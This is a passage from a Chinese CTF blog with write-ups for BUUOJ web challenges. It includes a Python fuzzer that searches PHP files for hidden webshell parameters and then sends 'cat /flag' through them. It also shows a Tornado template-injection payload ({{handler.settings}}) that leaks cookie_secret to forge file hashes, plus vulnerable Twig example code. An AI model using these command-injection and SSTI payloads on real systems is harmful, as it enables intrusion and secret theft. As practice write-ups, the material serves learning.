class="built_in">text</span>.<span class="built_in">find</span>(<span class="string">'glzjin'</span>) != -<span class="number">1</span>:</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        print(<span class="string">"end at: %s s"</span> % <span class="built_in">time</span>.<span class="built_in">time</span>())</span><br><span class="line">        <span class="keyword">exit</span>()</span><br><span class="line">   <span class="meta"># <span class="meta-keyword">else</span>:</span></span><br><span class="line">        <span class="meta">#print(<span class="meta-string">"1"</span>)</span></span><br><span class="line"></span><br><span class="line">    <span class="meta"># assert test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> <span class="built_in">params</span>:</span><br><span class="line">        <span class="built_in">params</span>[i] = <span class="built_in">params</span>[i][:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> data:</span><br><span class="line">        data[i] = data[i][:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://127.0.0.1/src/'</span> + file, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)</span><br><span class="line">    <span class="keyword">if</span> r.<span class="built_in">text</span>.<span class="built_in">find</span>(<span class="string">'glzjin'</span>) != -<span class="number">1</span>:</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        print(<span class="string">"end at: %s s"</span> % <span class="built_in">time</span>.<span class="built_in">time</span>())</span><br><span class="line">        <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">    <span class="meta"># system test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> <span class="built_in">params</span>:</span><br><span class="line">        <span class="built_in">params</span>[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> data:</span><br><span class="line">        data[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://127.0.0.1/src/'</span> + file, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)</span><br><span class="line">    <span class="keyword">if</span> r.<span class="built_in">text</span>.<span class="built_in">find</span>(<span class="string">'glzjin'</span>) != -<span class="number">1</span>:</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        print(<span class="string">"end at: %s s"</span> % <span class="built_in">time</span>.<span class="built_in">time</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">#print(<span class="meta-string">"===================="</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> <span class="variable">__name__</span> == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"start at: %s s"</span> % <span class="built_in">time</span>.<span class="built_in">time</span>())</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    <span class="keyword">for</span> file <span class="built_in">in</span> files:    </span><br><span class="line">        task = loop.create_task(read_file(file))</span><br><span class="line">    loop.run_until_complete(task)</span><br></pre></td></tr></table></figure>

<p>感觉它跑的也好慢，嘶~是不是哪里出错了。</p>
<p>所以最后还是多线程（虽然python是伪多线程）胜利了？</p>
<p>那最后再改改赵师傅的脚本（也没改多少，就是多输出一个data和params，省的还要审计半天2333）</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xk0SzyKwfzw.php found!</span><br><span class="line">&#123;<span class="symbol">'sDCPHvsvwWo</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'V5th2o3Pea_6O</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'amQ2A0SPU</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'riZH5vvoY</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'ZCBPLk</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'wWMgYch</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'Detx3g1SfCf</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'tastJGHA5De</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'fgUPcHJZvkq</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'ppiJIyg</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'KtpWfYB</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);'&#125;</span><br><span class="line">&#123;<span class="symbol">'z5c_TrB</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'xd0UXc39w</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'DdWk_nXmZTF_Dt</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'dthxTqRPg8YtH</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'ImPVuGCXfrS</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'O0yRgyjaOF7m</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'DeMcscsp</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'YV8nqJDhD</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'EMNPxS2A7</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'kBVLzQEgb</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'Efa5BVG</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'i_QfWB2x1</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'E8NPXbr7Cq</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'zfEddFlxaK_FTO3A</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'qjWSY5fjcgNtb</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'qUVRuZTF27EhUKTI</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);'&#125;</span><br></pre></td></tr></table></figure>

<p>这么多参数，而且三种函数都会有回显，那就每种函数都试过来，（既然已经知道是system函数了，那。。。）</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">data</span>=&#123;<span class="string">'sDCPHvsvwWo'</span>: <span class="string">'cat /flag'</span>, <span class="string">'V5th2o3Pea_6O'</span>: <span class="string">'cat /flag'</span>, <span class="string">'amQ2A0SPU'</span>: <span class="string">'cat /flag'</span>, <span class="string">'riZH5vvoY'</span>: <span class="string">'cat /flag'</span>, <span class="string">'ZCBPLk'</span>: <span class="string">'cat /flag'</span>, <span class="string">'wWMgYch'</span>: <span class="string">'cat /flag'</span>, <span class="string">'Detx3g1SfCf'</span>: <span class="string">'cat /flag'</span>, <span class="string">'tastJGHA5De'</span>: <span class="string">'cat /flag'</span>, <span class="string">'fgUPcHJZvkq'</span>: <span class="string">'cat /flag'</span>, <span class="string">'ppiJIyg'</span>: <span class="string">'cat /flag'</span>, <span class="string">'KtpWfYB'</span>: <span class="string">'cat /flag'</span>&#125;</span><br><span class="line"><span class="keyword">params</span>=&#123;<span class="string">'z5c_TrB'</span>: <span class="string">'cat /flag'</span>, <span class="string">'xd0UXc39w'</span>: <span class="string">'cat /flag'</span>, <span class="string">'DdWk_nXmZTF_Dt'</span>: <span class="string">'cat /flag'</span>, <span class="string">'dthxTqRPg8YtH'</span>: <span class="string">'cat /flag'</span>, <span class="string">'ImPVuGCXfrS'</span>: <span class="string">'cat /flag'</span>, <span class="string">'O0yRgyjaOF7m'</span>: <span class="string">'cat /flag'</span>, <span class="string">'DeMcscsp'</span>: <span class="string">'cat /flag'</span>, <span class="string">'YV8nqJDhD'</span>: <span class="string">'cat /flag'</span>, <span class="string">'EMNPxS2A7'</span>: <span class="string">'cat /flag'</span>, <span class="string">'kBVLzQEgb'</span>: <span class="string">'cat /flag'</span>, <span class="string">'Efa5BVG'</span>: <span class="string">'cat /flag'</span>, <span class="string">'i_QfWB2x1'</span>: <span class="string">'cat /flag'</span>, <span class="string">'E8NPXbr7Cq'</span>: <span class="string">'cat /flag'</span>, <span class="string">'zfEddFlxaK_FTO3A'</span>: <span class="string">'cat /flag'</span>, <span class="string">'qjWSY5fjcgNtb'</span>: <span class="string">'cat /flag'</span>, <span class="string">'qUVRuZTF27EhUKTI'</span>: <span class="string">'cat /flag'</span>&#125;</span><br><span class="line">session = requests.Session()</span><br><span class="line">file= <span class="string">'xk0SzyKwfzw.php'</span></span><br><span class="line">s = session.post(<span class="string">'http://web15.buuoj.cn/'</span>+file,<span class="built_in">data</span>=<span class="built_in">data</span>,<span class="keyword">params</span>=<span class="keyword">params</span>)</span><br><span class="line">print(re.search(<span class="string">'flag&#123;(.*?)&#125;'</span>,s.text).<span class="keyword">group</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;flag&#123;us4882vyom353basexu6ai7c0i66gfag&#125;</span><br></pre></td></tr></table></figure>

<p>（啊，这样子下来感觉自己啥也没做啊，凑，wdnmd）</p>
<h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h3><p>这题倒像是个密码学的题</p>
<p>先看hints.txt:</p>
<p>md5(cookie_secret+md5(filename))</p>
<p>那么就有</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bf60e1051f59dbb931208200bcf8c08e=md5(<span class="name">cookie_secret+md5</span>(<span class="name">/hints</span>.txt))</span><br><span class="line"></span><br><span class="line"><span class="number">1e1439</span>df1c0c7eeb9e93a8e44a58bc9f=md5(<span class="name">cookie_secret+md5</span>(<span class="name">/welcome</span>.txt))	</span><br><span class="line"></span><br><span class="line"><span class="number">245</span>a5ccf5543f16709d8c22851af5454=md5(<span class="name">cookie_secret+md5</span>(<span class="name">/flag</span>.txt))</span><br></pre></td></tr></table></figure>

<p>/flag.txt中是</p>
<p>flag in /fllllllllllllag</p>
<p>所以这题逻辑就很简单，整到cookie_secret，构造payload，应该就可以了</p>
<p>那，这个secret怎么整呢？</p>
<p>实在不会，太菜了，不会口算md5</p>
<p>去看了下wp，啊，还是太年轻，welcome里的render有用，报错信息的url</p>
<p>?msg=Error    也算是个提示</p>
<p>正解为：</p>
<p>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。<br><a href="https://blog.csdn.net/qq78827534/article/details/80792514" target="_blank" rel="noopener">render函数介绍</a><br><a href="https://www.kancloud.cn/kancloud/python-basic/41712" target="_blank" rel="noopener">tornado模板self.render和模板变量传递</a></p>
<p>测试后发现还有一个error界面，格式为<code>/error?msg=Error</code>，怀疑存在<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击 （SSTI）</a></p>
<p>尝试<code>/error?msg=</code><br>在Tornado的前端页面模板中，datetime是指向python中datetime这个模块，Tornado提供了一些对象别名来快速访问对象，可以参考<a href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax" target="_blank" rel="noopener">Tornado官方文档</a></p>
<p>回显</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">module</span> <span class="string">'datetime'</span> <span class="keyword">from</span> <span class="string">'/usr/local/lib/python2.7/lib-dynload/datetime.so'</span>&gt;</span><br></pre></td></tr></table></figure>

<p><strong>通过查阅文档发现cookie_secret在Application对象settings属性中</strong>（这个最重要了）还发现self.application.settings有一个别名</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RequestHandler.settings</span><br><span class="line">An alias <span class="keyword">for</span> self<span class="selector-class">.application</span><span class="selector-class">.settings</span>.</span><br></pre></td></tr></table></figure>

<p>handler指向的处理当前这个页面的RequestHandler对象，<br>RequestHandler.settings指向self.application.settings，<br>因此handler.settings指向RequestHandler.application.settings。</p>
<p>构造payload获取cookie_secret</p>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">error</span>?msg=&#123;&#123;<span class="keyword">handler</span>.settings&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>(也不知道为啥RequestHandler.application.settings不行，RequestHandler.settings不行，咱也不知道，咱待会自己去查)</p>
<p><a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">这里我想将的是handler这个对象，handler指向的处理当前这个页面的RequestHandler对象！但我在Tornado的Blog Demo中，发现了这样的语句：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> &lt;title&gt;</span><br><span class="line"><span class="number">2</span>     &#123;&#123; escape(handler<span class="selector-class">.settings</span>[<span class="string">"blog_title"</span>]) &#125;&#125;</span><br><span class="line"><span class="number">3</span> &lt;/title&gt;</span><br><span class="line">但是奇怪的是RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性！</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">后来重新翻了一下文档，发现又是一个别名（URL）：</span><br><span class="line"></span><br><span class="line">RequestHandler.settings</span><br><span class="line"></span><br><span class="line">An alias <span class="keyword">for</span> self<span class="selector-class">.application</span><span class="selector-class">.settings</span>.</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">handler 指向RequestHandler</span><br><span class="line"></span><br><span class="line">而RequestHandler.settings又指向self<span class="selector-class">.application</span><span class="selector-class">.settings</span></span><br><span class="line"></span><br><span class="line">所以handler.settings就指向RequestHandler<span class="selector-class">.application</span><span class="selector-class">.settings</span>了！</span><br></pre></td></tr></table></figure>

<p>（看来这是默认就这么用了似乎2333）</p>
<p>回显：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">'autoreload'</span>: <span class="literal">True</span>, <span class="string">'compiled_template_cache'</span>: <span class="literal">False</span>, <span class="string">'cookie_secret'</span>: <span class="string">'M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r'</span>&#125;</span><br></pre></td></tr></table></figure>

<p>构造exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line"> md5 = hashlib.md5() </span><br><span class="line"> md5.update(s) </span><br><span class="line"> <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filehash</span><span class="params">()</span>:</span></span><br><span class="line"> filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line"> cookie_secret = <span class="string">'M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r'</span></span><br><span class="line"> print(md5(cookie_secret+md5(filename)))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"> filehash()</span><br></pre></td></tr></table></figure>

<p>构造payload</p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://web9.buuoj.cn/<span class="keyword">file</span>?<span class="keyword">filename</span>=/fllllllllllllag&amp;filehash=<span class="number">70</span>aed71508e50d160a73756a21e9953d</span><br></pre></td></tr></table></figure>

<h4 id="learning-1"><a href="#learning-1" class="headerlink" title="learning"></a>learning</h4><p><a href="https://blog.csdn.net/qq78827534/article/details/80792514" target="_blank" rel="noopener">render函数介绍</a></p>
<p>（表示没太看懂）</p>
<p><a href="https://www.kancloud.cn/kancloud/python-basic/41712" target="_blank" rel="noopener">tornado模板self.render和模板变量传递</a></p>
<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">重点看两个类中都有的self.render()，用这个方法引入相应的模板。</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    self.render("index.html")</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">显示index.html模板，但是此时并没有向模板网页传递任何数据，仅仅显示罢了。下面一个：</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    self.render("user.html",username=user_name,email=user_email,website=user_website,language=user_language)</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">与前面的不同在于，不仅仅是要引用模板网页user.html，还要向这个网页传递一些数据，例如username=user_name，含义就是，在模板中，某个地方是用username来标示得到的数据，而user_name是此方法中的一个变量，也就是对应一个数据，那么模板中的username也就对应了user_name的数据，这是通过username=user_name完成的（说的有点像外语了）。后面的变量同理。</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">然后是index.html</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!DOCTYPE html&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">title</span>&gt;</span>sign in your name<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Your Information<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Your name is </span><span class="template-variable">&#123;&#123;username&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Your email is </span><span class="template-variable">&#123;&#123;email&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Your website is </span><span class="template-variable">&#123;&#123;website&#125;&#125;</span><span class="xml">, it is very good. This website is make by </span><span class="template-variable">&#123;&#123;language&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">上面的模板代码存储为名为user.html的文件，并且和前面已经保存的在同一个目录中。</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">看HTML模板代码中，有类似</span><span class="template-variable">&#123;&#123;username&#125;&#125;</span><span class="xml">的变量，模板中用</span><span class="template-variable">&#123;&#123;&#125;&#125;</span><span class="xml">引入变量，这个变量就是在self.render()中规定的，两者变量名称一致，对应将相应的值对象引入到模板中。</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击 （SSTI）</a></p>
<p>但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure>

<p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见：</p>
<p><a href="https://image.3001.net/images/20151104/14466168501989.png" target="_blank" rel="noopener"><img src="/2019/07/30/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2_easy_tornado/14466168501989.png!small" alt="2.png"></a></p>
<p>对比上面两种情况，简单的说服务端模板注入的形成终究还是因为服务端相信了用户的输出而造成的（Web安全真谛：永远不要相信用户的输入！）。当然了，第二种情况下，攻击者不仅仅能插入 JavaScript 脚本，还能针对模板框架进行进一步的攻击，此部分只说明原理，在后面会对攻击利用进行详细说明和演示。</p>
<p>如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和<strong>解析</strong>最后输出。</p>
<p>借用本文第二部分所用到的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure>

<p>在 Twig 模板引擎里，  除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值，例如这里用户输入 name=20 ，则在服务端拼接的模版内容为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello &#123;&#123;<span class="number">2</span>*<span class="number">10</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Twig 模板引擎在编译模板的过程中会计算 20  中的表达式 2*10 ，会将其返回值 20  作为模板变量的值输出，如下图：</p>
<p><a href="https://image.3001.net/images/20151104/14466168807902.png" target="_blank" rel="noopener"><img src="/2019/07/30/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2_easy_tornado/14466168807902.png!small" alt="3.png"></a></p>
<p><a href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax" target="_blank" rel="noopener">Tornado官方文档</a></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p>
<p><a href="https://blog.csdn.net/weixin_44677409/article/details/94410580" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/94410580</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/30/高明的黑客_easy_tornado/" data-id="ck2g3l2iy000tlgv3iv6wmm8j" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/note/">note</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-WarmUp_随便注" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/28/WarmUp_随便注/" class="article-date">
  <time datetime="2019-07-28T14:43:55.000Z" itemprop="datePublished">2019-07-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/28/WarmUp_随便注/">WarmUp_随便注</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="WarmUp-随便注"><a href="#WarmUp-随便注" class="headerlink" title="WarmUp_随便注"></a>WarmUp_随便注</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>看是正式当一名web狗的第一天：先直接上<a href="https://buuoj.cn/challenges，面向题目学习。" target="_blank" rel="noopener">https://buuoj.cn/challenges，面向题目学习。</a></p>
<h3 id="WarmUp"><a href="#WarmUp" class="headerlink" title="WarmUp"></a>WarmUp</h3><p>基操后拿到源码和hint：flag not here, and flag in ffffllllaaaagggg</p>
<p>所以是简单的代码审计题目了：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span 